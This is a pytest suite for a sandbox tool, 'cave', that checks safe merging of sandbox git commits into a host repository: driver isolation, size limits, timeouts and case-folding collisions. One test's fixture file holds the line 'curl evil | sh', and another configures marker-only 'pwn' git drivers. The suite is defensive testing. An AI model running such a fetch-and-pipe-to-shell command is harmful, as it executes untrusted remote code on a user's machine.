import functools
import shutil
import subprocess
import tempfile

import pytest

from cave import collect, container, git, review, sandbox
from cave._testing.repos import SID, make_clone, make_repo, repo_entry, run_companion, run_git
from cave.errors import CaveError
from cave.paths import box_path

pytestmark = pytest.mark.usefixtures("active", "isolated_env")

merge = functools.partial(collect.merge, yes=True)


def host_commit(repo, content):
    (repo / "file.txt").write_text(content)
    run_git(repo, "commit", "-qam", "host")


def vm_commit(clone, name, content):
    (clone / name).write_text(content)
    run_git(clone, "add", "-A")
    run_git(clone, "commit", "-qm", f"add {name}")
    run_companion(SID, "--final", {"code": clone})


def move_main(repo):
    """Add a commit to main behind cave's back, leaving any checkout of it clean."""
    new = git.strict(repo, "commit-tree", "main^{tree}", "-p", "main", "-m", "moved")
    run_git(repo, "update-ref", "refs/heads/main", new)


def log(repo):
    return git.strict(repo, "log", "--format=%s", "main").split("\n")


def test_a_conflict_leaves_the_host_alone_and_no_scratch_clone(repo, stopped_sandbox, tmp_path, monkeypatch):
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path / "tmpdir"))
    host_commit(repo, "host\n")
    run_git(repo, "checkout", "-q", "--detach")
    before = [git.strict(repo, "rev-parse", "HEAD"), git.strict(repo, "ls-files", "-s"),
              (repo / "file.txt").stat().st_mtime_ns]
    assert not merge(SID)
    assert before == [git.strict(repo, "rev-parse", "HEAD"), git.strict(repo, "ls-files", "-s"),
                      (repo / "file.txt").stat().st_mtime_ns]
    assert git.query(repo, "symbolic-ref", "-q", "HEAD") == ""
    assert not git.in_progress(repo)
    assert list((tmp_path / "tmpdir").iterdir()) == []
    assert git.sandbox_refs(repo, SID)


def test_an_ignored_file_appearing_during_the_prompt_is_not_overwritten(repo, stopped_sandbox, monkeypatch):
    vm_commit(stopped_sandbox, "new.txt", "vm\n")
    (repo / ".git/info/exclude").write_text("new.txt\n")
    monkeypatch.setattr(review, "gate", lambda *args: (repo / "new.txt").write_text("mine\n"))
    assert not merge(SID)
    assert (repo / "new.txt").read_text() == "mine\n"
    assert log(repo) == ["first"]


def test_a_sandbox_gitattributes_cannot_reach_host_drivers_while_rebasing(repo, box, tmp_path, monkeypatch):
    """Host filters and merge drivers, wherever they're defined, stay out of the rebase.

    The host is on another branch, so nothing checks the landed .gitattributes out.
    """
    lines = repo / "lines.txt"
    lines.write_text("a\nb\nc\nd\ne\nf\n")
    run_git(repo, "add", "-A")
    run_git(repo, "commit", "-qm", "lines")
    shutil.rmtree(box / "code")
    clone = make_clone(repo, box / "code", SID)
    vm_commit(clone, ".gitattributes", "* filter=pwn merge=pwn\n")
    (clone / "lines.txt").write_text("a\nb\nc\nd\ne\nsandbox\n")
    vm_commit(clone, "other.txt", "x\n")
    lines.write_text("host\nb\nc\nd\ne\nf\n")  # so that lines.txt needs a real three-way merge
    run_git(repo, "commit", "-qam", "host")
    run_git(repo, "checkout", "-q", "-b", "side")

    marker = tmp_path / "pwned"
    host_config = tmp_path / "gitconfig"
    for key, value in {"filter.pwn.clean": f"touch {marker}; cat", "filter.pwn.smudge": f"touch {marker}; cat",
                       "merge.pwn.driver": f"touch {marker}; false"}.items():
        run_git(repo, "config", key, value)
        run_git(repo, "config", "--file", host_config, key, value)
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(host_config))
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "filter.pwn.smudge")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", f"touch {marker}; cat")

    assert merge(SID)
    assert git.strict(repo, "show", "main:lines.txt") == "host\nb\nc\nd\ne\nsandbox"
    assert not marker.exists()


@pytest.mark.parametrize("checked_out", [True, False])
def test_main_moving_after_the_rebase_forces_a_fresh_one(repo, stopped_sandbox, monkeypatch, checked_out):
    if not checked_out:
        run_git(repo, "checkout", "-q", "-b", "side")
    rebases = []
    real = git.rebase_in_scratch

    def rebase_then_main_moves(*args):
        result = real(*args)
        rebases.append(result)
        if len(rebases) == 1:
            move_main(repo)
        return result

    monkeypatch.setattr(git, "rebase_in_scratch", rebase_then_main_moves)
    assert merge(SID)
    assert len(rebases) == 2
    assert log(repo) == ["work", "moved", "first"]
    assert git.strict(repo, "rev-list", "--merges", "--count", "main") == "0"


def test_main_that_keeps_moving_holds_the_repo_back(repo, stopped_sandbox, monkeypatch):
    real = git.rebase_in_scratch

    def rebase_then_main_moves(*args):
        result = real(*args)
        move_main(repo)
        return result

    monkeypatch.setattr(git, "rebase_in_scratch", rebase_then_main_moves)
    assert not merge(SID)
    assert "work" not in log(repo)
    assert sandbox.all_ids() == [SID]
    assert git.sandbox_refs(repo, SID)


def test_commits_that_are_or_become_empty_stay_visible(repo, stopped_sandbox):
    run_git(stopped_sandbox, "commit", "-q", "--allow-empty", "-m", "empty")
    vm_commit(stopped_sandbox, "other.txt", "x\n")
    host_commit(repo, "sandbox\n")  # the same change as the commit called work
    assert merge(SID)
    assert log(repo) == ["add other.txt", "empty", "work", "host", "first"]


def test_the_committer_is_the_host_user_even_without_a_rebase_to_do(repo, stopped_sandbox, monkeypatch):
    run_git(repo, "config", "user.name", "host user")
    run_git(repo, "config", "user.email", "host@example.com")
    monkeypatch.delenv("GIT_COMMITTER_NAME")
    monkeypatch.delenv("GIT_COMMITTER_EMAIL")
    assert merge(SID)
    assert git.strict(repo, "log", "-1", "--format=%an %cn %ce", "main") == "t host user host@example.com"


def test_a_merge_that_waited_for_the_lock_goes_by_what_the_first_one_landed(repo, stopped_sandbox):
    stale = sandbox.clones(sandbox.load_meta(SID))[0]
    assert collect._land_repo(stale, SID, True, yes=True)
    assert not collect._land_repo(stale, SID, True, yes=True)
    assert log(repo) == ["work", "first"]


def test_merge_ignores_untracked_files_in_the_main_clone(repo, stopped_sandbox):
    (repo / "scratch.txt").write_text("x\n")
    assert merge(SID)
    assert (repo / "file.txt").read_text() == "sandbox\n"
    assert (repo / "scratch.txt").exists()


def add_second_repo(tmp_path, dirty=False, commits=True):
    """Give the sandbox a second repo, stopped with a commit waiting in its clone, or none."""
    other = make_repo(tmp_path / "other")
    clone = make_clone(other, box_path(SID) / "second", SID)
    if not commits:
        run_git(clone, "reset", "-q", "--hard", "refs/cave/delivered")
    run_companion(SID, "--final", {"code": box_path(SID) / "code", "second": clone})
    meta = sandbox.load_meta(SID)
    meta["repos"].append(repo_entry("second", other))
    sandbox.write_meta(SID, meta)
    if dirty:
        (other / "file.txt").write_text("dirty\n")
    return other


def test_merge_leaves_repos_without_changes_alone(repo, stopped_sandbox, tmp_path):
    other = add_second_repo(tmp_path, dirty=True, commits=False)
    assert merge(SID)
    assert (other / "file.txt").read_text() == "dirty\n"
    assert (repo / "file.txt").read_text() == "sandbox\n"


def test_discard_cleans_an_orphan_ref_from_inside_the_repo(repo, monkeypatch):
    run_git(repo, "update-ref", f"refs/cave/{SID}/abc", "HEAD")
    monkeypatch.chdir(repo)
    collect.discard(SID)
    assert git.sandbox_ref_ids(repo) == []


def test_the_host_never_touches_a_clone(repo, stopped_sandbox, monkeypatch, capfd):
    """No host process names the clone, and landing works with it unreadable."""
    seen = []
    real_popen = subprocess.Popen

    def popen(args, **kwargs):
        seen.append([*map(str, args), str(kwargs.get("cwd"))])
        return real_popen(args, **kwargs)

    monkeypatch.setattr(subprocess, "Popen", popen)
    stopped_sandbox.chmod(0)
    collect.diff(SID, patch=True)
    assert "+sandbox" in capfd.readouterr().out
    assert merge(SID)
    assert (repo / "file.txt").read_text() == "sandbox\n"
    assert seen and not [args for args in seen if any(str(stopped_sandbox) in arg for arg in args)]


def test_a_running_sandbox_that_will_not_answer_is_held_back(repo, stopped_sandbox, active, monkeypatch):
    active.add(SID)
    monkeypatch.setattr(container, "run_companion", lambda *args: False)
    with pytest.raises(CaveError, match="did not answer"):
        merge(SID)
    assert (repo / "file.txt").read_text() == "one\n"
    assert sandbox.all_ids() == [SID]


def test_a_new_path_that_case_folds_onto_a_tracked_one_is_refused(repo, stopped_sandbox):
    (repo / "run.sh").write_text("echo safe\n")
    run_git(repo, "add", "run.sh")
    run_git(repo, "commit", "-qm", "run.sh")
    vm_commit(stopped_sandbox, "RUN.SH", "curl evil | sh\n")
    assert not merge(SID)
    assert log(repo) == ["run.sh", "first"] and (repo / "run.sh").read_text() == "echo safe\n"
    assert git.sandbox_refs(repo, SID)


def test_a_nested_repo_with_an_ignored_file_in_the_way_blocks_the_merge():
    assert collect._in_the_way({"vendor/foo/secrets.yml"}, ["vendor/foo/"]) == ["vendor/foo/secrets.yml"]


def test_the_size_a_rebase_would_write_counts_every_entry(repo):
    run_git(repo, "checkout", "-q", "-b", "bomb")
    for name in "abc":
        (repo / name).write_bytes(b"0" * 1000)
    run_git(repo, "add", "-A")
    run_git(repo, "commit", "-qm", "bomb")
    assert git.written_bytes(repo, "main", "bomb") == 3000


def test_many_entries_of_one_blob_count_once_each(repo):
    run_git(repo, "checkout", "-q", "-b", "bomb")
    for number in range(30):
        (repo / f"f{number}").write_bytes(b"0" * 100000)
    run_git(repo, "add", "-A")
    run_git(repo, "commit", "-qm", "bomb")
    assert git.written_bytes(repo, "main", "bomb") == 30 * 100000


def test_each_commit_counts_what_it_checks_out(repo):
    run_git(repo, "checkout", "-q", "-b", "bomb")
    for number in range(4):
        (repo / "f").write_bytes(b"0" * (1000 + number))  # one path, a new blob each time
        run_git(repo, "add", "-A")
        run_git(repo, "commit", "-qm", "bomb")
    assert git.written_bytes(repo, "main", "bomb") == 4006


def test_a_listing_too_long_to_read_counts_as_over_the_limit(repo, monkeypatch):
    run_git(repo, "checkout", "-q", "-b", "bomb")
    for number in range(30):
        (repo / f"f{number}").write_text("x")
    run_git(repo, "add", "-A")
    run_git(repo, "commit", "-qm", "bomb")
    monkeypatch.setattr(git, "MAX_LISTING", 200)
    assert git.written_bytes(repo, "main", "bomb") > git.MAX_WRITTEN


def test_a_bundle_that_would_write_too_much_is_refused_and_nothing_changes(repo, stopped_sandbox, monkeypatch, capsys):
    for number in range(30):
        (stopped_sandbox / f"f{number}").write_bytes(b"0" * 1000)  # one blob, thirty paths
    run_git(stopped_sandbox, "add", "-A")
    run_git(stopped_sandbox, "commit", "-qm", "bomb")
    run_companion(SID, "--final", {"code": stopped_sandbox})
    before = git.strict(repo, "rev-parse", "main")
    monkeypatch.setattr(git, "MAX_WRITTEN", 10000)
    assert not merge(SID)
    err = " ".join(capsys.readouterr().err.split())
    assert "held back code: rebasing it would write 0 MiB, over the 0 MiB limit" in err and "Everything is kept" in err
    assert git.strict(repo, "rev-parse", "main") == before and not (repo / "f0").exists()
    assert sandbox.all_ids() == [SID] and git.sandbox_refs(repo, SID)


def test_a_rebase_that_takes_too_long_is_held_back_with_everything_kept(repo, stopped_sandbox, tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path / "tmpdir"))
    vm_commit(stopped_sandbox, "new.txt", "x\n")
    before = git.strict(repo, "rev-parse", "main")
    monkeypatch.setattr(git, "REBASE_TIMEOUT", 0)
    assert not merge(SID)
    err = capsys.readouterr().err
    assert "rebasing it took over 0 seconds and was stopped. Everything is kept" in err
    assert git.strict(repo, "rev-parse", "main") == before
    assert sandbox.all_ids() == [SID] and git.sandbox_refs(repo, SID)
    assert list((tmp_path / "tmpdir").iterdir()) == []


def test_a_merge_that_lost_the_race_to_a_deleting_one_says_so_instead_of_a_raw_error(repo, stopped_sandbox, monkeypatch):
    def lose(*args):
        shutil.rmtree(box_path(SID))
        raise OSError(2, "No such file or directory", ".meta.lock")

    monkeypatch.setattr(collect, "_land_repo", lose)
    with pytest.raises(CaveError, match="another cave command landed it"):
        merge(SID)


def test_diff_refuses_a_bundle_that_would_write_too_much_and_shows_nothing_as_no_changes(
        repo, stopped_sandbox, monkeypatch, capsys):
    for number in range(30):
        (stopped_sandbox / f"f{number}").write_bytes(b"0" * 1000)
    run_git(stopped_sandbox, "add", "-A")
    run_git(stopped_sandbox, "commit", "-qm", "bomb")
    run_companion(SID, "--final", {"code": stopped_sandbox})
    monkeypatch.setattr(git, "MAX_WRITTEN", 10000)
    monkeypatch.setattr(review, "_changes", lambda *args: pytest.fail("listed a commit over the limit"))
    assert not collect.diff(SID)
    captured = capsys.readouterr()
    assert "over the 0 MiB limit" in captured.err and captured.out == ""


def test_a_conflict_whose_sandbox_was_deleted_meanwhile_says_so_cleanly(repo, stopped_sandbox, monkeypatch):
    def gone(*args):
        sandbox.delete(SID)
        raise git.RebaseFailed("CONFLICT")

    monkeypatch.setattr(collect, "_land_repo", gone)
    with pytest.raises(CaveError, match=f"sandbox {SID} is gone"):
        collect._land_all(SID, sandbox.clones(sandbox.load_meta(SID)), False, True, False)
